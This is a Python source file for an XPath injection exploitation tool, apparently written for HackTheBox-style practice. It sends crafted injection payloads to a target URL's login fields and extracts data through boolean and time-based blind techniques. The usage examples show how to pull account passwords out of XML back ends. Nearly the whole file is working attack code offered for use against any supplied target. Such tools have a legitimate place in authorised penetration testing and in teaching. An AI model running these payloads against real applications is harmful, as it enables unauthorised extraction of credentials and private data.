#!/usr/bin/env python3
"""
XPathNinja - Advanced XPath Injection Exploitation Tool
Author: 0x001
GitHub: https://github.com/Oxooi
HackTheBox: https://app.hackthebox.com/profile/1158811
"""

import requests
import string
import argparse
from time import time, sleep
from typing import Optional, List

# Configuration
KEYWORD_DICT = list(string.ascii_letters + string.digits + "_-@.!#$%{}")
DEFAULT_TIMEOUT = 10
DEFAULT_MAX_LENGTH = 50

class XPathNinja:
    """Main class for XPath injection exploitation"""
    
    def __init__(self, target_url: str, use_proxy: bool = False, proxy_url: str = "http://127.0.0.1:8080"):
        """
        Initialize XPathNinja
        
        Args:
            target_url: Target URL to exploit
            use_proxy: Enable proxy (for Burp Suite debugging)
            proxy_url: Proxy URL (default: Burp Suite)
        """
        self.target_url = target_url
        self.proxy = {"http": proxy_url, "https": proxy_url} if use_proxy else None
        self.session = requests.Session()
        
    def _send_payload(self, payload: dict, timeout: int = DEFAULT_TIMEOUT) -> Optional[requests.Response]:
        """
        Send HTTP POST request with payload
        
        Args:
            payload: Dictionary containing POST data
            timeout: Request timeout in seconds
            
        Returns:
            Response object or None on error
        """
        try:
            response = self.session.post(
                self.target_url,
                data=payload,
                proxies=self.proxy,
                timeout=timeout,
                verify=False
            )
            return response
        except requests.exceptions.RequestException as e:
            print(f"\n[-] Request error: {e}")
            return None
    
    def classic_extraction(self, 
                          xpath_query: str,
                          success_indicator: str,
                          username_field: str = "username",
                          msg_field: str = "msg",
                          max_length: int = DEFAULT_MAX_LENGTH) -> str:
        """
        Classic XPath injection extraction (character by character)
        
        Args:
            xpath_query: XPath query to extract (e.g., "name(/*[1])" or "/accounts/account[1]/password")
            success_indicator: String that indicates successful injection
            username_field: Name of the username field in POST request
            msg_field: Name of the message field in POST request
            max_length: Maximum number of characters to extract
            
        Returns:
            Extracted string
        """
        result = ""
        
        print("[*] Starting classic XPath extraction...")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] XPath Query: {xpath_query}")
        print("-" * 80)
        
        for position in range(1, max_length + 1):
            char_found = False
            
            for char in KEYWORD_DICT:
                # Display progress
                print(f"\r[*] Position {position} | Testing: {result}{char}", end='', flush=True)
                
                # Build payload
                injection = f"invalid' or substring({xpath_query},{position},1)='{char}' and '1'='1"
                payload = {
                    username_field: injection,
                    msg_field: "test"
                }
                
                # Send request
                response = self._send_payload(payload)
                if not response:
                    return result
                
                # Check if character found
                if response.status_code == 200 and success_indicator in response.text:
                    result += char
                    print(f"\r[+] Position {position} | Found: '{char}' → Current result: {result}")
                    char_found = True
                    break
            
            # Stop if no character found
            if not char_found:
                print(f"\r[!] No more characters found after position {position - 1}")
                break
        
        print("\n" + "=" * 80)
        print(f"[✓] Extracted value: {result}")
        print("=" * 80)
        
        return result
    
    def count_nodes(self,
                   xpath_query: str,
                   success_indicator: str,
                   username_field: str = "username",
                   msg_field: str = "msg",
                   max_count: int = 100) -> int:
        """
        Count XML nodes using XPath injection
        
        Args:
            xpath_query: XPath count query (e.g., "/accounts/*")
            success_indicator: String that indicates successful injection
            username_field: Name of the username field in POST request
            msg_field: Name of the message field in POST request
            max_count: Maximum number to test
            
        Returns:
            Number of nodes found
        """
        print("[*] Starting node counting...")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] XPath Query: count({xpath_query})")
        print("-" * 80)
        
        for count in range(max_count + 1):
            print(f"\r[*] Testing count: {count}", end='', flush=True)
            
            injection = f"invalid' or count({xpath_query})={count} and '1'='1"
            payload = {
                username_field: injection,
                msg_field: "test"
            }
            
            response = self._send_payload(payload)
            if not response:
                return 0
            
            if response.status_code == 200 and success_indicator in response.text:
                print(f"\r[+] Found: {count} nodes")
                print("=" * 80)
                return count
        
        print(f"\r[-] No match found (tested up to {max_count})")
        return 0
    
    def time_based_extraction(self,
                             xpath_query: str,
                             username_field: str = "username",
                             msg_field: str = "msg",
                             max_length: int = DEFAULT_MAX_LENGTH,
                             baseline_samples: int = 3,
                             threshold_offset: float = 2.0) -> str:
        """
        Time-based blind XPath injection
        
        Args:
            xpath_query: XPath query to extract
            username_field: Name of the username field in POST request
            msg_field: Name of the message field in POST request
            max_length: Maximum number of characters to extract
            baseline_samples: Number of samples for baseline calculation
            threshold_offset: Time offset above baseline to detect true condition
            
        Returns:
            Extracted string
        """
        result = ""
        
        print("[*] Starting time-based blind extraction...")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] XPath Query: {xpath_query}")
        print("-" * 80)
        
        # Calculate baseline response time
        print("[*] Calculating baseline response time...")
        baseline_times = []
        
        for i in range(baseline_samples):
            payload = {
                username_field: "invalid' or '1'='2",
                msg_field: "test"
            }
            
            start = time()
            response = self._send_payload(payload, timeout=30)
            if response:
                elapsed = time() - start
                baseline_times.append(elapsed)
        
        if not baseline_times:
            print("[-] Failed to calculate baseline")
            return ""
        
        baseline_avg = sum(baseline_times) / len(baseline_times)
        threshold = baseline_avg + threshold_offset
        
        print(f"[+] Baseline average: {baseline_avg:.3f}s")
        print(f"[+] Detection threshold: {threshold:.3f}s")
        print("-" * 80)
        
        # Extract characters
        for position in range(1, max_length + 1):
            char_found = False
            
            for char in KEYWORD_DICT:
                print(f"\r[*] Position {position} | Testing: {result}{char} | ", end='', flush=True)
                
                # Time-based payload
                injection = f"invalid' or (substring({xpath_query},{position},1)='{char}' and count((//.)[count((//.))]) ) or '1'='2"
                payload = {
                    username_field: injection,
                    msg_field: "test"
                }
                
                try:
                    start = time()
                    response = self._send_payload(payload, timeout=30)
                    elapsed = time() - start
                    
                    print(f"Time: {elapsed:.3f}s", end='', flush=True)
                    
                    # Check if time significantly longer
                    if elapsed > threshold:
                        result += char
                        print(f"\r[+] Position {position} | Found: '{char}' (Time: {elapsed:.3f}s) → Result: {result}")
                        char_found = True
                        sleep(0.5)
                        break
                        
                except requests.exceptions.Timeout:
                    # Timeout = very likely the correct character
                    result += char
                    print(f"\r[+] Position {position} | Found: '{char}' (TIMEOUT) → Result: {result}")
                    char_found = True
                    break
            
            if not char_found:
                print(f"\r[!] No more characters found after position {position - 1}")
                break
        
        print("\n" + "=" * 80)
        print(f"[✓] Extracted value: {result}")
        print("=" * 80)
        
        return result


def display_banner():
    """Display tool banner"""
    print("\n")
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 78 + "║")
    print("║" + "🥷 XPathNinja - XPath Injection Exploitation Tool".center(78) + "║")
    print("║" + " " * 78 + "║")
    print("║" + "Made By: 0x001".center(78) + "║")
    print("║" + "Github: https://github.com/Oxooi".center(78) + "║")
    print("║" + " " * 78 + "║")
    print("╚" + "═" * 78 + "╝")
    print("\n")


def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(
        description="XPathNinja - Advanced XPath Injection Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Extract node name
  python xpath_ninja.py -u http://target.com/index.php -m classic -q "name(/*[1])" -s "success"
  
  # Extract password
  python xpath_ninja.py -u http://target.com/index.php -m classic -q "/accounts/account[1]/password" -s "success"
  
  # Count nodes
  python xpath_ninja.py -u http://target.com/index.php -m count -q "/accounts/*" -s "success"
  
  # Time-based extraction
  python xpath_ninja.py -u http://target.com/index.php -m time -q "/accounts/account[1]/username"
  
  # Use with Burp Suite proxy
  python xpath_ninja.py -u http://target.com/index.php -m classic -q "name(/*[1])" -s "success" --proxy
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--mode", required=True, choices=["classic", "count", "time"],
                       help="Exploitation mode")
    parser.add_argument("-q", "--query", required=True, help="XPath query to exploit")
    parser.add_argument("-s", "--success", help="Success indicator string (required for classic/count modes)")
    parser.add_argument("--proxy", action="store_true", help="Use proxy (Burp Suite on 127.0.0.1:8080)")
    parser.add_argument("--proxy-url", default="http://127.0.0.1:8080", help="Custom proxy URL")
    parser.add_argument("--username-field", default="username", help="Username field name (default: username)")
    parser.add_argument("--msg-field", default="msg", help="Message field name (default: msg)")
    parser.add_argument("--max-length", type=int, default=50, help="Maximum extraction length (default: 50)")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.mode in ["classic", "count"] and not args.success:
        parser.error("--success is required for classic and count modes")
    
    # Display banner
    display_banner()
    
    # Initialize XPathNinja
    ninja = XPathNinja(args.url, use_proxy=args.proxy, proxy_url=args.proxy_url)
    
    # Execute selected mode
    try:
        if args.mode == "classic":
            ninja.classic_extraction(
                xpath_query=args.query,
                success_indicator=args.success,
                username_field=args.username_field,
                msg_field=args.msg_field,
                max_length=args.max_length
            )
        
        elif args.mode == "count":
            ninja.count_nodes(
                xpath_query=args.query,
                success_indicator=args.success,
                username_field=args.username_field,
                msg_field=args.msg_field
            )
        
        elif args.mode == "time":
            ninja.time_based_extraction(
                xpath_query=args.query,
                username_field=args.username_field,
                msg_field=args.msg_field,
                max_length=args.max_length
            )
    
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        exit(0)


if __name__ == "__main__":
    main()